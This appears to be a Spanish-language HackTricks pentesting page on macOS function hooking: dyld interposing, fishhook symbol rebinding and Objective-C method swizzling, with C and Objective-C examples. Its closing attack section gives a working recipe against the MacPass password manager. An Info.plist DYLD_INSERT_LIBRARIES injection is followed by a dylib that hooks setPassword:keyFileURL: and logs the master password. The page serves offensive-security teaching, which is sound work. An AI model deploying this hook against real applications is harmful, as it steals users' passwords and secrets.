# macOS Function Hooking

{{#include ../../../banners/hacktricks-training.md}}

## Function Interposing

Crea un **dylib** con una sección **`__interpose` (`__DATA___interpose`)** (o una sección marcada con **`S_INTERPOSING`**) que contenga tuplas de **punteros a funciones** que apunten a las funciones **original** y **replacement**.

Luego, **inject** el dylib con **`DYLD_INSERT_LIBRARIES`** (el interposing debe ocurrir antes de que cargue la app principal). Obviamente, las [**restrictions**] aplicadas al uso de **`DYLD_INSERT_LIBRARIES`** también aplican aquí ([macos-library-injection/index.html#check-restrictions](macos-library-injection/index.html#check-restrictions)).

### Interpose printf

{{#tabs}}
{{#tab name="interpose.c"}}
```c:interpose.c" overflow="wrap
// gcc -dynamiclib interpose.c -o interpose.dylib
#include <stdio.h>
#include <stdarg.h>

int my_printf(const char *format, ...) {
//va_list args;
//va_start(args, format);
//int ret = vprintf(format, args);
//va_end(args);

int ret = printf("Hello from interpose\n");
return ret;
}

__attribute__((used)) static struct { const void *replacement; const void *replacee; } _interpose_printf
__attribute__ ((section ("__DATA,__interpose"))) = { (const void *)(unsigned long)&my_printf, (const void *)(unsigned long)&printf };
```
{{#endtab}}

{{#tab name="hello.c"}}
```c
//gcc hello.c -o hello
#include <stdio.h>

int main() {
printf("Hello World!\n");
return 0;
}
```
{{#endtab}}

{{#tab name="interpose2.c"}}
```c
// Just another way to define an interpose
// gcc -dynamiclib interpose2.c -o interpose2.dylib

#include <stdio.h>

#define DYLD_INTERPOSE(_replacement, _replacee) \
__attribute__((used)) static struct { \
const void* replacement; \
const void* replacee; \
} _interpose_##_replacee __attribute__ ((section("__DATA, __interpose"))) = { \
(const void*) (unsigned long) &_replacement, \
(const void*) (unsigned long) &_replacee \
};

int my_printf(const char *format, ...)
{
int ret = printf("Hello from interpose\n");
return ret;
}

DYLD_INTERPOSE(my_printf,printf);
```
{{#endtab}}
{{#endtabs}}
```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./hello
Hello from interpose

DYLD_INSERT_LIBRARIES=./interpose2.dylib ./hello
Hello from interpose
```
> [!WARNING]
> La variable de entorno **`DYLD_PRINT_INTERPOSING`** se puede usar para depurar el interposing y imprimirá el proceso de interpose.

También ten en cuenta que **el interposing ocurre entre el proceso y las bibliotecas cargadas**, no funciona con la caché de bibliotecas compartidas.

### Dynamic Interposing

Ahora también es posible interpose una función dinámicamente usando la función **`dyld_dynamic_interpose`**. Esto permite **programáticamente** interposear una función en **runtime** en lugar de hacerlo solo desde el **principio**.

Solo es necesario indicar las **tuplas** de la **función a reemplazar y la función de reemplazo**.
```c
struct dyld_interpose_tuple {
const void* replacement;
const void* replacee;
};
extern void dyld_dynamic_interpose(const struct mach_header* mh,
const struct dyld_interpose_tuple array[], size_t count);
```
### Rebinding de la tabla de importación (estilo fishhook)

Si ya tienes ejecución de código **dentro del proceso** y quieres enganchar una **función C importada** sin relanzar el objetivo, un primitivo muy común es el **symbol rebinding** (popularizado por **`fishhook`**).

En lugar de usar la sección **`__interpose`**, esta técnica recorre los metadatos Mach-O (`__LINKEDIT` -> indirect symbol table -> `__la_symbol_ptr` / `__nl_symbol_ptr`) y **sobrescribe el slot de importación** usado por la imagen actual. Esto es muy útil para enganchar funciones en un proceso **ya en ejecución** o para enganchar **solo una imagen** con **`rebind_symbols_image`**.

> [!TIP]
> Esto solo afecta a las llamadas que realmente pasan por un **import pointer**. Si la función objetivo se **llama directamente dentro de la misma imagen**, no hay un slot importado que reescribir, así que esta técnica no verá ese punto de llamada.
```c
// clang -dynamiclib fishhook_demo.c fishhook.c -o fishhook_demo.dylib
#include <stdio.h>
#include <unistd.h>
#include "fishhook.h"

static int (*real_close)(int);

int hooked_close(int fd) {
fprintf(stderr, "[+] close(%d)\n", fd);
return real_close(fd);
}

__attribute__((constructor))
static void install(void) {
struct rebinding rb = {"close", hooked_close, (void *)&real_close};
rebind_symbols(&rb, 1);
}
```

```bash
DYLD_INSERT_LIBRARIES=./fishhook_demo.dylib ./hello
```
En versiones recientes de macOS, muchos targets de rebinding ya no están en páginas **`__DATA`** escribibles. Los rebinders normalmente necesitan hacer **`__DATA_CONST`** escribible temporalmente antes de parchear el puntero. Además, en Apple Silicon / **`arm64e`** debes esperar punteros autenticados y una indirection extra en **`__AUTH_CONST.__auth_got`**, así que un rebinder que solo escanee las secciones clásicas de lazy/non-lazy symbol pointers puede perder algunos call sites.

> [!CAUTION]
> El ABI de **`arm64e`** usa **Pointer Authentication (PAC)** para muchos function pointers. Las escrituras ciegas de punteros que antes funcionaban en Intel pueden romper un call site en Apple Silicon. Al escribir tu propio rebinder o inline hooker, prepárate para usar helpers de **`<ptrauth.h>`** como **`ptrauth_sign_unauthenticated`** o **`ptrauth_auth_and_resign`** y prueba específicamente en targets **`arm64e`**.

Para más detalles sobre **`__AUTH`**, **`__AUTH_CONST`** y **`__auth_got`**, revisa [this page](../macos-apps-inspecting-debugging-and-fuzzing/objects-in-memory.md).

## Method Swizzling

En ObjectiveC esto es cómo se llama a un method: **`[myClassInstance nameOfTheMethodFirstParam:param1 secondParam:param2]`**

Se necesitan el **object**, el **method** y los **params**. Y cuando se llama a un method, se **envía un msg** usando la función **`objc_msgSend`**: `int i = ((int (*)(id, SEL, NSString *, NSString *))objc_msgSend)(someObject, @selector(method1p1:p2:), value1, value2);`

El object es **`someObject`**, el method es **`@selector(method1p1:p2:)`** y los argumentos son **value1**, **value2**.

Siguiendo las estructuras del object, es posible llegar a un **array of methods** donde los **names** y **pointers** al código del method están **located**.

> [!CAUTION]
> Ten en cuenta que, como los methods y classes se acceden basándose en sus names, esta información se almacena en el binary, así que es posible recuperarla con `otool -ov </path/bin>` o [`class-dump </path/bin>`](https://github.com/nygard/class-dump)

### Accessing the raw methods

Es posible acceder a la información de los methods como name, número de params o address como en el siguiente ejemplo:
```objectivec
// gcc -framework Foundation test.m -o test

#import <Foundation/Foundation.h>
#import <objc/runtime.h>
#import <objc/message.h>

int main() {
// Get class of the variable
NSString* str = @"This is an example";
Class strClass = [str class];
NSLog(@"str's Class name: %s", class_getName(strClass));

// Get parent class of a class
Class strSuper = class_getSuperclass(strClass);
NSLog(@"Superclass name: %@",NSStringFromClass(strSuper));

// Get information about a method
SEL sel = @selector(length);
NSLog(@"Selector name: %@", NSStringFromSelector(sel));
Method m = class_getInstanceMethod(strClass,sel);
NSLog(@"Number of arguments: %d", method_getNumberOfArguments(m));
NSLog(@"Implementation address: 0x%lx", (unsigned long)method_getImplementation(m));

// Iterate through the class hierarchy
NSLog(@"Listing methods:");
Class currentClass = strClass;
while (currentClass != NULL) {
unsigned int inheritedMethodCount = 0;
Method* inheritedMethods = class_copyMethodList(currentClass, &inheritedMethodCount);

NSLog(@"Number of inherited methods in %s: %u", class_getName(currentClass), inheritedMethodCount);

for (unsigned int i = 0; i < inheritedMethodCount; i++) {
Method method = inheritedMethods[i];
SEL selector = method_getName(method);
const char* methodName = sel_getName(selector);
unsigned long address = (unsigned long)method_getImplementation(m);
NSLog(@"Inherited method name: %s (0x%lx)", methodName, address);
}

// Free the memory allocated by class_copyMethodList
free(inheritedMethods);
currentClass = class_getSuperclass(currentClass);
}

// Other ways to call uppercaseString method
if([str respondsToSelector:@selector(uppercaseString)]) {
NSString *uppercaseString = [str performSelector:@selector(uppercaseString)];
NSLog(@"Uppercase string: %@", uppercaseString);
}

// Using objc_msgSend directly
NSString *uppercaseString2 = ((NSString *(*)(id, SEL))objc_msgSend)(str, @selector(uppercaseString));
NSLog(@"Uppercase string: %@", uppercaseString2);

// Calling the address directly
IMP imp = method_getImplementation(class_getInstanceMethod(strClass, @selector(uppercaseString))); // Get the function address
NSString *(*callImp)(id,SEL) = (typeof(callImp))imp; // Generates a function capable to method from imp
NSString *uppercaseString3 = callImp(str,@selector(uppercaseString)); // Call the method
NSLog(@"Uppercase string: %@", uppercaseString3);

return 0;
}
```
### Method Swizzling with method_exchangeImplementations

La función **`method_exchangeImplementations`** permite **cambiar** la **dirección** de la **implementación** de **una función por la de la otra**.

> [!CAUTION]
> Entonces, cuando se llama a una función, lo que se **ejecuta es la otra**.
```objectivec
//gcc -framework Foundation swizzle_str.m -o swizzle_str

#import <Foundation/Foundation.h>
#import <objc/runtime.h>


// Create a new category for NSString with the method to execute
@interface NSString (SwizzleString)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from;

@end

@implementation NSString (SwizzleString)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from {
NSLog(@"Custom implementation of substringFromIndex:");

// Call the original method
return [self swizzledSubstringFromIndex:from];
}

@end

int main(int argc, const char * argv[]) {
// Perform method swizzling
Method originalMethod = class_getInstanceMethod([NSString class], @selector(substringFromIndex:));
Method swizzledMethod = class_getInstanceMethod([NSString class], @selector(swizzledSubstringFromIndex:));
method_exchangeImplementations(originalMethod, swizzledMethod);

// We changed the address of one method for the other
// Now when the method substringFromIndex is called, what is really called is swizzledSubstringFromIndex
// And when swizzledSubstringFromIndex is called, substringFromIndex is really called

// Example usage
NSString *myString = @"Hello, World!";
NSString *subString = [myString substringFromIndex:7];
NSLog(@"Substring: %@", subString);

return 0;
}
```
> [!WARNING]
> En este caso, si el **código de implementación del método legítimo** **verifica** el **nombre** del **método**, podría **detectar** este swizzling y evitar que se ejecute.
>
> La siguiente técnica no tiene esta restricción.

### Method Swizzling con method_setImplementation

El formato anterior es raro porque estás cambiando la implementación de 2 métodos uno por el otro. Usando la función **`method_setImplementation`** puedes **cambiar** la **implementación** de un **método por la del otro**.

Solo recuerda **guardar la dirección de la implementación del original** si vas a llamarla desde la nueva implementación antes de sobrescribirla, porque después será mucho más complicado localizar esa dirección.
```objectivec
#import <Foundation/Foundation.h>
#import <objc/runtime.h>
#import <objc/message.h>

static IMP original_substringFromIndex = NULL;

@interface NSString (Swizzlestring)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from;

@end

@implementation NSString (Swizzlestring)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from {
NSLog(@"Custom implementation of substringFromIndex:");

// Call the original implementation using objc_msgSendSuper
return ((NSString *(*)(id, SEL, NSUInteger))original_substringFromIndex)(self, _cmd, from);
}

@end

int main(int argc, const char * argv[]) {
@autoreleasepool {
// Get the class of the target method
Class stringClass = [NSString class];

// Get the swizzled and original methods
Method originalMethod = class_getInstanceMethod(stringClass, @selector(substringFromIndex:));

// Get the function pointer to the swizzled method's implementation
IMP swizzledIMP = method_getImplementation(class_getInstanceMethod(stringClass, @selector(swizzledSubstringFromIndex:)));

// Swap the implementations
// It return the now overwritten implementation of the original method to store it
original_substringFromIndex = method_setImplementation(originalMethod, swizzledIMP);

// Example usage
NSString *myString = @"Hello, World!";
NSString *subString = [myString substringFromIndex:7];
NSLog(@"Substring: %@", subString);

// Set the original implementation back
method_setImplementation(originalMethod, original_substringFromIndex);

return 0;
}
}
```
## Hooking Attack Methodology

En esta página se discutieron diferentes formas de hook functions. Sin embargo, implicaban **ejecutar código dentro del proceso para atacar**.

Para hacerlo, la técnica más sencilla de usar es inyectar un [Dyld via environment variables or hijacking](macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md). Sin embargo, supongo que esto también podría hacerse mediante [Dylib process injection](macos-ipc-inter-process-communication/index.html#dylib-process-injection-via-task-port).

Sin embargo, ambas opciones están **limitadas** a binarios/procesos **unprotected**. Revisa cada técnica para aprender más sobre las limitaciones.

Aun así, un function hooking attack es algo muy específico; un atacante haría esto para **robar información sensible desde dentro de un proceso** (si no, simplemente harías un process injection attack). Y esta información sensible podría estar ubicada en Apps descargadas por el usuario como MacPass.

Así que el vector del atacante sería encontrar una vulnerabilidad o quitar la firma de la aplicación, inyectar la variable de entorno **`DYLD_INSERT_LIBRARIES`** a través del Info.plist de la aplicación añadiendo algo como:
```xml
<key>LSEnvironment</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/Applications/Application.app/Contents/malicious.dylib</string>
</dict>
```
y luego **vuelve a registrar** la aplicación:
```bash
/System/Library/Frameworks/CoreServices.framework/Frameworks/LaunchServices.framework/Support/lsregister -f /Applications/Application.app
```
Agrega en esa librería el código de hooking para exfiltrar la información: Passwords, messages...

> [!CAUTION]
> Ten en cuenta que en versiones más nuevas de macOS, si **eliminas la firma** del binario de la aplicación y esta ya se había ejecutado previamente, macOS **ya no ejecutará la aplicación**.

#### Library example
```objectivec
// gcc -dynamiclib -framework Foundation sniff.m -o sniff.dylib

// If you added env vars in the Info.plist don't forget to call lsregister as explained before

// Listen to the logs with something like:
// log stream --style syslog --predicate 'eventMessage CONTAINS[c] "Password"'

#include <Foundation/Foundation.h>
#import <objc/runtime.h>

// Here will be stored the real method (setPassword in this case) address
static IMP real_setPassword = NULL;

static BOOL custom_setPassword(id self, SEL _cmd, NSString* password, NSURL* keyFileURL)
{
// Function that will log the password and call the original setPassword(pass, file_path) method
NSLog(@"[+] Password is: %@", password);

// After logging the password call the original method so nothing breaks.
return ((BOOL (*)(id,SEL,NSString*, NSURL*))real_setPassword)(self, _cmd,  password, keyFileURL);
}

// Library constructor to execute
__attribute__((constructor))
static void customConstructor(int argc, const char **argv) {
// Get the real method address to not lose it
Class classMPDocument = NSClassFromString(@"MPDocument");
Method real_Method = class_getInstanceMethod(classMPDocument, @selector(setPassword:keyFileURL:));

// Make the original method setPassword call the fake implementation one
IMP fake_IMP = (IMP)custom_setPassword;
real_setPassword = method_setImplementation(real_Method, fake_IMP);
}
```
## Referencias

- [https://nshipster.com/method-swizzling/](https://nshipster.com/method-swizzling/)
- [https://github.com/facebook/fishhook](https://github.com/facebook/fishhook)
- [https://clang.llvm.org/docs/PointerAuthentication.html](https://clang.llvm.org/docs/PointerAuthentication.html)

{{#include ../../../banners/hacktricks-training.md}}
